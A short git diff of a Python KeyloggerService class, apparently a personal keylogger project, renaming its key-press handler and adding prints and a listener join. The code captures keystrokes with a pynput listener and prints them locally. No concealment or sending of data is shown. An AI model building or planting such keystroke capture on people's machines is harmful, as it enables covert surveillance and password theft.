@@ -33,7 +33,7 @@ class KeyloggerService(IKeyLogger):
         self.listener = None
 
 
-    def on_press(self,key):
+    def _on_press(self,key):
         k = str(key).replace("'", "")
         if k == "Key.space":
             self.keys.append(" ")
@@ -41,13 +41,15 @@ class KeyloggerService(IKeyLogger):
             self.keys.append("\n")
         elif "Key" not in k:
             self.keys.append(k)
-        # print(f"Key pressed: {k}")
+        print(self.keys)
 
 
     def start_logging(self):
         if self.listener is None:
-            self.listener = Listener(on_press=self.on_press)
+            self.listener = Listener(on_press=self._on_press)
             self.listener.start()
+            self.listener.join()
+            print(self.keys)
 
 
 
